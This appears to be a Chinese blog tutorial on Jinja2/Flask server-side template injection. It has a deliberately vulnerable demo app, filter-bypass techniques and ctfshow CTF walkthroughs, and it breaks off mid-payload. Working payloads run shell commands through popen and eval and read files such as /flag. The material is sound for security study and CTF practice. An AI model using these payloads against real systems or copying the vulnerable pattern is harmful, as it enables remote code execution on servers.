    &lt;label for=&quot;name&quot;&gt;Enter your name:&lt;/label&gt;</span><br><span class="hljs-code">        &lt;input type=&quot;text&quot; id=&quot;name&quot; name=&quot;name&quot;&gt;</span><br><span class="hljs-code">        &lt;input type=&quot;submit&quot; value=&quot;Greet me&quot;&gt;</span><br><span class="hljs-code">    &lt;/form&gt;</span><br><span class="hljs-code">    &#x27;&#x27;&#x27;</span><br><span class="hljs-code">@app.route(&#x27;/greet&#x27;, methods=[&#x27;POST&#x27;])</span><br><span class="hljs-code">def greet():</span><br><span class="hljs-code">    name = request.form[&#x27;name&#x27;]</span><br><span class="hljs-code">    # 这里使用 render_template_string 存在模板注入风险</span><br><span class="hljs-code">    template = f&quot;Hello, &#123;name&#125;!&quot;</span><br><span class="hljs-code">    return render_template_string(template)</span><br><span class="hljs-code">if __name__ == &#x27;__main__&#x27;:</span><br><span class="hljs-code">    app.run(debug=True)</span><br></code></pre></td></tr></table></figure><p><img src="/../../images/%E6%96%87%E7%AB%A0/ssti/1.png" alt="ex1"></p><p><img src="/../../images/%E6%96%87%E7%AB%A0/ssti/2.png" alt="ex2"></p><h3 id="2简单判断"><a class="markdownIt-Anchor" href="#2简单判断"></a> 2.简单判断</h3><p>模板引擎其实有许多种，上面的例子只是python的一种。</p><p><img src="/../../images/%E6%96%87%E7%AB%A0/ssti/3.png" alt="pic"></p><p>可以通过简要的尝试进行初步判断类型。</p><p><img src="/../../images/%E6%96%87%E7%AB%A0/ssti/4.png" alt="判断"></p><h2 id="二-语法"><a class="markdownIt-Anchor" href="#二-语法"></a> 二、语法</h2><h3 id="1基础语法"><a class="markdownIt-Anchor" href="#1基础语法"></a> 1.基础语法</h3><p>在python中，主要流程是按照类-&gt;基类-&gt;子类-&gt;危险函数的流程利用ssti，首先了解一下语法。</p><h4 id="1__class__"><a class="markdownIt-Anchor" href="#1__class__"></a> 1.__class__</h4><p>用来查看变量所属的类,格式为<code>变量.__class__</code></p><p>比如字符串得到的就是<code>&lt;class 'str'&gt;</code></p><h4 id="2__bases__"><a class="markdownIt-Anchor" href="#2__bases__"></a> 2.__bases__</h4><p>以元组的形式返回类所直接继承的类。，注意是类的基类，格式为<code>变量.__class__.__bases__</code></p><p>同时也可以加上数组，比如<code>变量.__class__.__bases__[0]</code>来获得第一个基类。</p><p>ps(base是以字符串的形式返回类的基类)</p><h4 id="3__mro__"><a class="markdownIt-Anchor" href="#3__mro__"></a> 3.__mro__</h4><p>返回一个包含对象所继承的基类元组,返回解析方法调用的顺序。</p><h4 id="4__subclasses__"><a class="markdownIt-Anchor" href="#4__subclasses__"></a> 4.__subclasses__()</h4><p>获取类的所有子类，同时也可以在末尾加数组，指定索引值。</p><h4 id="5__init__"><a class="markdownIt-Anchor" href="#5__init__"></a> 5.__init__</h4><p>类的初始化，返回为function。便于利用该函数调用globals。</p><h4 id="6__globals__"><a class="markdownIt-Anchor" href="#6__globals__"></a> 6.__globals__</h4><p><code>function.__globals__</code>，用于获取function所处空间下可使用的module、方法以及所有变量。</p><hr><p>以上是常见的一些基本语法内容</p><h3 id="2类的知识总结"><a class="markdownIt-Anchor" href="#2类的知识总结"></a> 2.类的知识总结</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-strong">__class__</span>            类的一个内置属性，表示实例对象的类。<br><span class="hljs-strong">__base__</span>             类型对象的直接基类<br><span class="hljs-strong">__bases__</span>            类型对象的全部基类，以元组形式，类型的实例通常没有属性 <span class="hljs-strong">__bases__</span><br><span class="hljs-strong">__mro__</span>              此属性是由类组成的元组，在方法解析期间会基于它来查找基类。<br><span class="hljs-strong">__subclasses__</span>()     返回这个类的子类集合，<br><span class="hljs-strong">__init__</span>             初始化类，返回的类型是function<br><span class="hljs-strong">__globals__</span>          使用方式是 函数名.<span class="hljs-strong">__globals__</span>获取function所处空间下可使用的module、方法以及所有变量。<br><span class="hljs-strong">__dic__</span>              类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的<span class="hljs-strong">__dict__</span>里<br><span class="hljs-strong">__getattribute__</span>()   实例、类、函数都具有的<span class="hljs-strong">__getattribute__</span>魔术方法。事实上，在实例化的对象进行.操作的时候（形如：a.xxx/a.xxx()），都会自动去调用<span class="hljs-strong">__getattribute__</span>方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。<br><span class="hljs-strong">__getitem__</span>()        调用字典中的键值，其实就是调用这个魔术方法，比如a[&#x27;b&#x27;]，就是a.<span class="hljs-strong">__getitem__</span>(&#x27;b&#x27;)<br><span class="hljs-strong">__builtins__</span>         内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。<span class="hljs-strong">__builtins__</span>与<span class="hljs-strong">__builtin__</span>的区别就不放了，百度都有。<br><span class="hljs-strong">__import__</span>           动态加载类和函数，也就是导入模块，经常用于导入os模块，<span class="hljs-strong">__import__</span>(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()]<br><span class="hljs-strong">__str__</span>()            返回描写这个对象的字符串，可以理解成就是打印出来。<br>url<span class="hljs-emphasis">_for              flask的一个方法，可以用于得到<span class="hljs-strong">__builtins__</span>，而且url_</span>for.<span class="hljs-strong">__globals__</span>[&#x27;<span class="hljs-strong">__builtins__</span>&#x27;]含有current<span class="hljs-emphasis">_app。</span><br><span class="hljs-emphasis">get_</span>flashed<span class="hljs-emphasis">_messages flask的一个方法，可以用于得到<span class="hljs-strong">__builtins__</span>，而且url_</span>for.<span class="hljs-strong">__globals__</span>[&#x27;<span class="hljs-strong">__builtins__</span>&#x27;]含有current<span class="hljs-emphasis">_app。</span><br><span class="hljs-emphasis">lipsum               flask的一个方法，可以用于得到<span class="hljs-strong">__builtins__</span>，而且lipsum.<span class="hljs-strong">__globals__</span>含有os模块：&#123;&#123;lipsum.<span class="hljs-strong">__globals__</span>[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;</span><br><span class="hljs-emphasis">current_</span>app          应用上下文，一个全局变量。<br><br>request              可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取open函数:request.<span class="hljs-strong">__init__</span>.<span class="hljs-strong">__globals__</span>[&#x27;<span class="hljs-strong">__builtins__</span>&#x27;].open(&#x27;/proc\self\fd/3&#x27;).read()<br>request.args.x1    get传参<br>request.values.x1  所有参数<br>request.cookies      cookies参数<br>request.headers      请求头参数<br>request.form.x1    post传参(Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)<br>request.data   post传参(Content-Type:a/b)<br>request.json post传json  (Content-Type: application/json)<br>config               当前application的所有配置。此外，也可以这样&#123;&#123; config.<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__init__</span>.<span class="hljs-strong">__globals__</span>[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read() &#125;&#125;<br>g                    &#123;&#123;g&#125;&#125;得到<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">flask.g</span> <span class="hljs-attr">of</span> &#x27;<span class="hljs-attr">flask_ssti</span>&#x27;&gt;</span></span><br></code></pre></td></tr></table></figure><h3 id="3常见过滤器"><a class="markdownIt-Anchor" href="#3常见过滤器"></a> 3.常见过滤器</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs markdown">常用的过滤器<br>int()：将值转换为int类型；<br>float()：将值转换为float类型；<br>lower()：将字符串转换为小写；<br>upper()：将字符串转换为大写；<br>title()：把值中的每个单词的首字母都转成大写<br>capitalize()：把变量值的首字母转成大写，其余字母转小写；<br>trim()：截取字符串前面和后面的空白字符；<br>wordcount()：计算一个长字符串中单词的个数；<br>reverse()：字符串反转；<br>replace(value,old,new)： 替换将old替换为new的字符串；<br>truncate(value,length=255,killwords=False)：截取length长度的字符串；<br>striptags()：删除字符串中所有的HTML标签，如果出现多个空格，将替换成一个空格；<br>escape()或e：转义字符，会将&lt;、&gt;等符号转义成HTML中的符号。显例：content|escape或content|e。<br>safe()： 禁用HTML转义，如果开启了全局转义，那么safe过滤器会将变量关掉转义。示例： &#123;&#123;&#x27;<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span></span>hello<span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span></span>&#x27;|safe&#125;&#125;；<br>list()：将变量列成列表；<br>string()：将变量转换成字符串；<br>join()：将一个序列中的参数值拼接成字符串。示例看上面payload；<br>abs()：返回一个数值的绝对值；<br>first()：返回一个序列的第一个元素；<br>last()：返回一个序列的最后一个元素；<br>format(value,arags,<span class="hljs-emphasis">*kwargs)：格式化字符串。比如：&#123;&#123; &quot;%s&quot; - &quot;%s&quot;|format(&#x27;Hello?&#x27;,&quot;Foo!&quot;) &#125;&#125;将输出：Helloo? - Foo!</span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis">length()：返回一个序列或者字典的长度；</span><br><span class="hljs-emphasis">sum()：返回列表内数值的和；</span><br><span class="hljs-emphasis">sort()：返回排序后的列表；</span><br><span class="hljs-emphasis">default(value,default_value,boolean=false)：如果当前变量没有值，则会使用参数中的值来代替。示例：name|default(&#x27;xiaotuo&#x27;)----如果name不存在，则会使用xiaotuo来替代。boolean=False默认是在只有这个变量为undefined的时候才会用default中的值，如果想使用python的形式判断是否为false，则可以传递boolean=true。也可以使用or来替换。</span><br><span class="hljs-emphasis">length()返回字符串的长度，别名是count</span><br></code></pre></td></tr></table></figure><p>对于2.3两个是直接进行转载便于自身本地的及时查找。</p><h2 id="三-进阶知识"><a class="markdownIt-Anchor" href="#三-进阶知识"></a> 三、进阶知识</h2><h3 id="1模板语法"><a class="markdownIt-Anchor" href="#1模板语法"></a> 1.模板语法</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs markdown">&#123;%...%&#125;可以进行声明变量，也可以进行循环语句和条件语句<br><br>&#123;&#123;...&#125;&#125;将表达式打印到模板输出<br><br>&#123;#...#&#125;表示未包含在模板输出中的注释<br><br><span class="hljs-section">##可以有和&#123;%%&#125;相同的效果</span><br></code></pre></td></tr></table></figure><h3 id="2变量"><a class="markdownIt-Anchor" href="#2变量"></a> 2.变量</h3><p>标准的python语法使用点<code>（.）</code>外，还可以使用中括号<code>（[]）</code>来访问变量的属性。也就是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;<span class="hljs-string">&quot;&quot;</span>.__class__&#125;&#125;<br>&#123;&#123;<span class="hljs-string">&quot;&quot;</span>[<span class="hljs-string">&#x27;__classs__&#x27;</span>]&#125;&#125;<br></code></pre></td></tr></table></figure><p>You can use a dot (.) to access attributes of a variable in addition to the standard Python <strong>getitem</strong> “subscript” syntax ([]). --官方原文</p><p>这里就是介绍了如果禁用点可以用中括号，而实际就是调用了getitem这个函数，对于取键值也可以调用这个函数</p><hr><p>除此之外，除了调用，也可以用自带的一些办法，比如说pop</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs markdown">pop(key[,default])<br>参数<br>key: 要删除的键值<br>default: 如果没有 key，返回 default 值<br>删除字典给定键 key 所对应的值，返回值为被删除的值。key值必须给出。 否则，返回default值。<br></code></pre></td></tr></table></figure><p>也可以用<code>list.pop(&quot;var&quot;)</code>,建议不要使用，可能删除导致服务器崩坏。</p><p>同时也可以尝试以下两种的情况</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs markdown">dict.get(key, default=None)<br>返回指定键的值，如果值不在字典中返回default值<br><br>dict.setdefault(key, default=None)<br>和get()类似, 但如果键不存在于字典中，将会添加键并将值设为default<br></code></pre></td></tr></table></figure><hr><p>调用变量的实际情况，应该如</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs markdown">&quot;&quot;.<span class="hljs-strong">__class__</span><br>&quot;&quot;.<span class="hljs-strong">__getattribute__</span>(&quot;<span class="hljs-strong">__class__</span>&quot;)<br></code></pre></td></tr></table></figure><p>如果出现了一些过滤，也可以进行简单的绕过</p><h3 id="3绕过"><a class="markdownIt-Anchor" href="#3绕过"></a> 3.绕过</h3><h4 id="1拼接"><a class="markdownIt-Anchor" href="#1拼接"></a> 1.拼接</h4><p>“cla”+“ss”</p><p>实际测试的时候，jinjia2默认<code>&quot;cla&quot;&quot;ss&quot;</code>是等同于<code>&quot;class&quot;</code>的，所以也不必加+。</p><h4 id="2反转"><a class="markdownIt-Anchor" href="#2反转"></a> 2.反转</h4><p>“<strong>ssalc</strong>”[::-1]</p><h4 id="3ascii绕过"><a class="markdownIt-Anchor" href="#3ascii绕过"></a> 3.ascii绕过</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 将97转换为对应的字符&#x27;a&#x27;</span><br>char_a = <span class="hljs-string">&quot;&#123;0:c&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">97</span>)<br><span class="hljs-built_in">print</span>(char_a)  <span class="hljs-comment"># 输出: &#x27;a&#x27;</span><br><span class="hljs-comment"># 将多个整数转换为对应的字符并组合成字符串&#x27;__class__&#x27;</span><br>formatted_string = <span class="hljs-string">&quot;&#123;0:c&#125;&#123;1:c&#125;&#123;2:c&#125;&#123;3:c&#125;&#123;4:c&#125;&#123;5:c&#125;&#123;6:c&#125;&#123;7:c&#125;&#123;8:c&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">95</span>, <span class="hljs-number">95</span>, <span class="hljs-number">99</span>, <span class="hljs-number">108</span>, <span class="hljs-number">97</span>, <span class="hljs-number">115</span>, <span class="hljs-number">115</span>, <span class="hljs-number">95</span>, <span class="hljs-number">95</span>)<br><span class="hljs-built_in">print</span>(formatted_string)  <span class="hljs-comment"># 输出: &#x27;__class__&#x27;</span><br></code></pre></td></tr></table></figure><p>前面的{0:c}是占位符，类比下去对应后面的内容。</p><h4 id="4编码绕过"><a class="markdownIt-Anchor" href="#4编码绕过"></a> 4.编码绕过</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 直接字符表示</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;__class__&quot;</span>)<br><br><span class="hljs-comment"># 转义字符表示</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\x5f\x5fclass\x5f\x5f&quot;</span>)<br><span class="hljs-comment">#十六进制转义</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f&quot;</span>)<br><span class="hljs-comment">#十六进制加ascii转义</span><br><span class="hljs-comment"># 对于python2也可以Base64 编码和解码</span><br>encoded_str = <span class="hljs-string">&quot;X19jbGFzc19f&quot;</span><br>decoded_str = encoded_str.decode(<span class="hljs-string">&quot;base64&quot;</span>)<br><span class="hljs-built_in">print</span>(decoded_str)  <span class="hljs-comment"># 输出: &#x27;__class__&#x27;</span><br></code></pre></td></tr></table></figure><h4 id="5利用chr函数"><a class="markdownIt-Anchor" href="#5利用chr函数"></a> 5.利用chr函数</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;% <span class="hljs-built_in">set</span> <span class="hljs-built_in">chr</span>=url_for.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].<span class="hljs-built_in">chr</span> %&#125;<br><span class="hljs-comment">#这里使用了 Jinja2 模板中的 set 语句，将 chr 函数赋值给一个模板变量 chr。</span><br><span class="hljs-comment">#chr函数将数字转化为字符</span><br>&#123;&#123;<span class="hljs-string">&quot;&quot;</span>[<span class="hljs-built_in">chr</span>(<span class="hljs-number">95</span>)%2bchr(<span class="hljs-number">95</span>)%2bchr(<span class="hljs-number">99</span>)%2bchr(<span class="hljs-number">108</span>)%2bchr(<span class="hljs-number">97</span>)%2bchr(<span class="hljs-number">115</span>)%2bchr(<span class="hljs-number">115</span>)%2bchr(<span class="hljs-number">95</span>)%2bchr(<span class="hljs-number">95</span>)]&#125;&#125;<br><span class="hljs-comment">#最终显示的也是__class__</span><br></code></pre></td></tr></table></figure><h4 id="6利用~拼接"><a class="markdownIt-Anchor" href="#6利用~拼接"></a> 6.利用~拼接</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;%<span class="hljs-built_in">set</span> a=<span class="hljs-string">&#x27;__cla&#x27;</span> %&#125;&#123;%<span class="hljs-built_in">set</span> b=<span class="hljs-string">&#x27;ss__&#x27;</span>%&#125;&#123;&#123;<span class="hljs-string">&quot;&quot;</span>[a~b]&#125;&#125;<br></code></pre></td></tr></table></figure><h4 id="7大小写绕过"><a class="markdownIt-Anchor" href="#7大小写绕过"></a> 7.大小写绕过</h4><p>前提是只过滤大写或者小写，比如</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;</span>[<span class="hljs-string">&quot;__CLASS__&quot;</span>.lower()]<br></code></pre></td></tr></table></figure><h3 id="4过滤器"><a class="markdownIt-Anchor" href="#4过滤器"></a> 4.过滤器</h3><p>这部分内容上面都有一个表，主要跟着详细介绍一下</p><h4 id="1attr"><a class="markdownIt-Anchor" href="#1attr"></a> 1.attr</h4><p>用于动态访问对象的属性，即访问管道符前面的内容</p><p>常用于.和[]被过滤的情况，比如</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown">&quot;&quot;|attr(&quot;<span class="hljs-strong">__class__</span>&quot;)<br>相当于<br>&quot;&quot;.<span class="hljs-strong">__class__</span><br></code></pre></td></tr></table></figure><p>返回的就是str</p><h4 id="2format"><a class="markdownIt-Anchor" href="#2format"></a> 2.format</h4><p>功能可以参考ascii的绕过，直接放案例了</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs markdown">&quot;%c%c%c%c%c%c%c%c%c&quot;|format(95,95,99,108,97,115,115,95,95)==&#x27;<span class="hljs-strong">__class__</span>&#x27;<br>&quot;&quot;[&quot;%c%c%c%c%c%c%c%c%c&quot;|format(95,95,99,108,97,115,115,95,95)]<br></code></pre></td></tr></table></figure><h4 id="3first-last-random"><a class="markdownIt-Anchor" href="#3first-last-random"></a> 3.first ,last, random</h4><p>返回第一个最后一个或者随机，随机可以写脚本爆破，举个例子，如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;</span>.__class__.__mro__|last()<br>相当于<br><span class="hljs-string">&quot;&quot;</span>.__class__.__mro__[-<span class="hljs-number">1</span>]<br></code></pre></td></tr></table></figure><h4 id="4join"><a class="markdownIt-Anchor" href="#4join"></a> 4.join</h4><p>我个人认为就是用于拼接的，直接上例子，如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;</span>[[<span class="hljs-string">&#x27;__clas&#x27;</span>,<span class="hljs-string">&#x27;s__&#x27;</span>]|join] 或者 <span class="hljs-string">&quot;&quot;</span>[(<span class="hljs-string">&#x27;__clas&#x27;</span>,<span class="hljs-string">&#x27;s__&#x27;</span>)|join]<br>相当于<br><span class="hljs-string">&quot;&quot;</span>[<span class="hljs-string">&quot;__class__&quot;</span>]<br></code></pre></td></tr></table></figure><h4 id="5select和string"><a class="markdownIt-Anchor" href="#5select和string"></a> 5.select和string</h4><p>顾名思义选择和转化为字符，先选择字符串的内容，再转化为字母，可以构造拼接__class__</p><h2 id="四-靶场练习"><a class="markdownIt-Anchor" href="#四-靶场练习"></a> 四、靶场练习</h2><h4 id="知识点利用链"><a class="markdownIt-Anchor" href="#知识点利用链"></a> 知识点:利用链</h4><p>注意因python2,3以及版本的原因，是有部分差异的</p><p><strong>1.os._wrap_close</strong> 类popen,比如下面</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">&quot;&quot;.<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__bases__</span>[<span class="hljs-string">0</span>].<span class="hljs-strong">__subclasses__</span>()[<span class="hljs-string">134</span>].<span class="hljs-strong">__init__</span>.<span class="hljs-strong">__globals__</span>[<span class="hljs-string">&#x27;popen&#x27;</span>](<span class="hljs-link">&#x27;whoami&#x27;</span>).read()<br></code></pre></td></tr></table></figure><p><strong>2.os直接使用</strong></p><p><strong>3.__import__下的os</strong></p><p>种类还有很多，可以自己多加尝试总结。</p><p><strong>4.flask内置</strong></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs markdown">Flask内置函数和内置对象可以通过&#123;&#123;self.<span class="hljs-strong">__dict__</span>.<span class="hljs-emphasis">_TemplateReference<span class="hljs-strong">__context.keys()&#125;&#125;查看，然后可以查看一下这几个东西的类型，类可以通过__</span>init<span class="hljs-strong">__方法跳到os，函数直接用__</span>globals<span class="hljs-strong">__方法跳到os。（payload一下子就简洁了）</span></span><br><span class="hljs-strong"><span class="hljs-emphasis"></span></span><br><span class="hljs-strong"><span class="hljs-emphasis">&#123;&#123;self.__</span>dict<span class="hljs-strong">__._TemplateReference__</span>context.keys()&#125;&#125;</span><br><span class="hljs-emphasis">#查看内置函数</span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis">#函数：lipsum、url_</span>for、get<span class="hljs-emphasis">_flashed_</span>messages<br><span class="hljs-section">#类：cycler、joiner、namespace、config、request、session</span><br>&#123;&#123;lipsum.<span class="hljs-strong">__globals__</span>.os.popen(&#x27;ls&#x27;).read()&#125;&#125;<br><span class="hljs-section">#函数</span><br>&#123;&#123;cycler.<span class="hljs-strong">__init__</span>.<span class="hljs-strong">__globals__</span>.os.popen(&#x27;ls&#x27;).read()&#125;&#125;<br><span class="hljs-section">#类</span><br></code></pre></td></tr></table></figure><p><strong>5.通过getshell</strong></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs markdown">原理就是找到含有 <span class="hljs-strong">__builtins__</span> 的类，然后利用<br><br>&#123;% for c in [].<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__base__</span>.<span class="hljs-strong">__subclasses__</span>() %&#125;&#123;% if c.<span class="hljs-strong">__name__</span>==&#x27;catch<span class="hljs-emphasis">_warnings&#x27; %&#125;&#123;&#123; c.<span class="hljs-strong">__init__</span>.<span class="hljs-strong">__globals__</span>[&#x27;<span class="hljs-strong">__builtins__</span>&#x27;].eval(&quot;<span class="hljs-strong">__import__</span>(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="hljs-emphasis">#读写文件</span><br><span class="hljs-emphasis">&#123;% for c in [].<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__base__</span>.<span class="hljs-strong">__subclasses__</span>() %&#125;&#123;% if c.<span class="hljs-strong">__name__</span>==&#x27;catch_</span>warnings&#x27; %&#125;&#123;&#123; c.<span class="hljs-strong">__init__</span>.<span class="hljs-strong">__globals__</span>[&#x27;<span class="hljs-strong">__builtins__</span>&#x27;].open(&#x27;filename&#x27;, &#x27;r&#x27;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;<br></code></pre></td></tr></table></figure><h3 id="1ctfshow-361"><a class="markdownIt-Anchor" href="#1ctfshow-361"></a> 1.ctfshow 361</h3><p>尝试一下**?name=49**,发现是模板注入，输出是49</p><p>接着常规思路</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">?name=&#123;&#123;&#x27;&#x27;.<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__mro__</span>&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="/../../images/%E6%96%87%E7%AB%A0/ssti/361-1.png" alt="361-1"></p><p>继续找子类,搜索os</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">?name=&#123;&#123;&#x27;&#x27;.<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__mro__</span>[1].<span class="hljs-strong">__subclasses__</span>()&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="/../../images/%E6%96%87%E7%AB%A0/ssti/361-2.png" alt="361-2"></p><p>利用这里面的popen得到flag</p><p>因为每个环境使用的python库不同 所以类的排序有差异，本地并不一定是132，比如我用的3.9本地测的是134,自己找脚本跑一下就得到132了</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">?name=&#123;&#123;&#x27;&#x27;.<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__mro__</span>[<span class="hljs-string">1</span>].<span class="hljs-strong">__subclasses__</span>()[<span class="hljs-string">132</span>].<span class="hljs-strong">__init__</span>.<span class="hljs-strong">__globals__</span>[<span class="hljs-string">&#x27;popen&#x27;</span>](<span class="hljs-link">&#x27;tac /????&#x27;</span>).read()&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="/../../images/%E6%96%87%E7%AB%A0/ssti/361-3.png" alt="361-3"></p><p>也可以用控制块来</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">?name=&#123;% print(url<span class="hljs-emphasis">_for.<span class="hljs-strong">__globals__</span>[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-symbol">&#x27;eval&#x27;</span>](&quot;<span class="hljs-strong">__import__</span>(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;))%&#125;</span><br></code></pre></td></tr></table></figure><h3 id="2ctfshow-362"><a class="markdownIt-Anchor" href="#2ctfshow-362"></a> 2.ctfshow 362</h3><p>正常的思路先测一下是否是模板注入</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">?name=&#123;&#123;1-1&#125;&#125;<br></code></pre></td></tr></table></figure><p>发现是正确的，然后测看看子类，也是可以进行的</p><p>但是最后发现应该把<strong>数字过滤</strong>了，那就试试另外一种吧</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">?name=&#123;% print(url<span class="hljs-emphasis">_for.<span class="hljs-strong">__globals__</span>[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-symbol">&#x27;eval&#x27;</span>](&quot;<span class="hljs-strong">__import__</span>(&#x27;os&#x27;).popen(&#x27;cat 